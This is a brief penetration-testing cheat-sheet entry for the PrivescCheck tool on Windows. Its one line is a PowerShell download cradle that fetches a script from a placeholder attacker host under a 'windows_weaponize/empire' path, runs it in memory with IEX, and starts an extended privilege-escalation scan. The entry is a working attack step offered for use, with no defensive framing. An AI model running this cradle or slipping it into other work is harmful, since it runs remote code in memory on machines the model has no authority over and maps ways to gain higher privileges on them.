# PrivescCheck

#plateform/windows #target/local #cat/RECON #tag/powershell

## onliner
```powershell
(new-object system.net.webclient).downloadstring('http://<local_ip>:<port|80>/windows/windows_weaponize/ps/empire/privesc/PrivescCheck.ps1') | IEX; Invoke-PrivescCheck -Extended
```